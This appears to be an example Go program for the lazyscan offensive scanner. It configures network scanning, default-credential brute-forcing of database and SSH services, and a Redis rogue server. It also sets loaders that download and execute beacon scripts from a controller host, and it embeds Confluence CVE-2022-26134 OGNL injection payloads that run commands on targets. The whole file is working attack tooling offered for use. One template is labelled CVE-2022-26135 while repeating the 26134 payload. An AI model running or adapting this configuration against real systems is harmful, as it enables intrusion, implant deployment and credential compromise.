package main

import (
	"context"
	"fmt"
	"strings"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/common/queue"
	"github.com/404tk/lazyscan/runner"
)

func main() {
	options := &runner.Options{
		Host:     "172.16.61.2,172.16.61.3", // 扫描目标
		NoPing:   false,                     // 不探活直接扫
		Scantype: "",                        // 默认扫描全部，可指定服务名称
		Timeout:  3,
		Threads:  600,
		LiveTop:  10,
		Downloader: common.Downloader{
			WinHTTP: common.Loader{
				Addr:        "http://192.168.1.2:8080/beacon.bat",
				FileName:    "beacon.bat",
				ExecCommand: "beacon.bat",
			},
			UnixHTTP: common.Loader{
				Addr:        "http://192.168.1.2:8080/beacon.sh", // 文件下载地址
				FileName:    "beacon.sh",                         // 文件缓存名称，默认路径为/tmp/
				ExecCommand: "beacon.sh",                         // 文件执行命令，可以添加参数
			},
			UnixTCP: common.Loader{
				Addr:        "192.168.1.2:8553/beacon.sh", // TCP文件下载地址
				FileName:    "beacon.sh",
				ExecCommand: "beacon.sh",
			},
		},
		RedisListen:      false,              // 是否运行时开启RedisRogueServer监听
		RedisRogueServer: "192.168.1.2:6380", // 监听IP+监听端口，支持外部监听
		Userdict: map[string][]string{
			"mysql":      {"root"},
			"ssh":        {"root"},
			"mssql":      {"sa"},
			"postgresql": {"postgres"},
		},
		Passwords: []string{"123456", "{user}", "{user}@123"},
		PortList: map[string]string{
			"ssh":           "22",
			"web":           "80,443,8080,8090",
			"mssql":         "1433",
			"docker-remote": "2375",
			"etcd":          "2379",
			"mysql":         "3306",
			"postgresql":    "5432",
			"redis":         "6379",
			"kube-api":      "6443",
			"kubelet":       "10250",
		},
		Accounts:        []string{"admin/123456", "test/test", "/"},
		DefaultPocsName: []string{"poc-yaml-confluence-cve-2022-26134"},
		CustomPocs: []string{`name: poc-yaml-confluence-cve-2022-26134
set:
    r1: randomInt(800000000, 1000000000)
    r2: randomInt(800000000, 1000000000)
    poc: ord("expr "+string(r1)+" + "+string(r2))
rules:
  - method: GET
    path: /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22,null%29.invoke%28null,null%29.setHeader%28%22X-CMD%22,Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{poc}},39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115%29%29%22%29%29%7D/
    follow_redirects: false
    expression: |
        "X-Cmd" in response.headers && response.headers["X-Cmd"].contains(string(r1 + r2))
    exploit:
      - method: GET
        path: /%24%7BClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{ord_unixloader}},39,41%29%29%22%29%7D/
        follow_redirects: false
detail:
    links:
    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-26134.yaml`, `name: poc-yaml-confluence-cve-2022-26135
set:
    r1: randomInt(800000000, 1000000000)
    r2: randomInt(800000000, 1000000000)
    poc: ord("expr "+string(r1)+" + "+string(r2))
rules:
  - method: GET
    path: /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22,null%29.invoke%28null,null%29.setHeader%28%22X-CMD%22,Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{poc}},39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115%29%29%22%29%29%7D/
    follow_redirects: false
    expression: |
        "X-Cmd" in response.headers && response.headers["X-Cmd"].contains(string(r1 + r2))
    exploit:
      - method: GET
        path: /%24%7BClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{ord_unixloader}},39,41%29%29%22%29%7D/
        follow_redirects: false
detail:
    links:
    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-26134.yaml`},
	}
	resultQueue := queue.NewQueue() // 扫描结果队列
	r, err := runner.New(options)
	if err != nil {
		return
	}
	result := r.Run(context.TODO(), resultQueue)
	// ICMP存活IP，不启用探活则默认全部存活，进一步扫描端口
	fmt.Println("AliveHosts:", strings.Join(result.AliveHosts, ", "))
	// 开放端口
	fmt.Println("AlivePorts:", strings.Join(result.AlivePorts, ", "))
	// 漏洞结果汇总
	vulns := resultQueue.Dump()
	for _, v := range vulns {
		res := v.(common.Vuln)
		fmt.Println(res)
	}
}
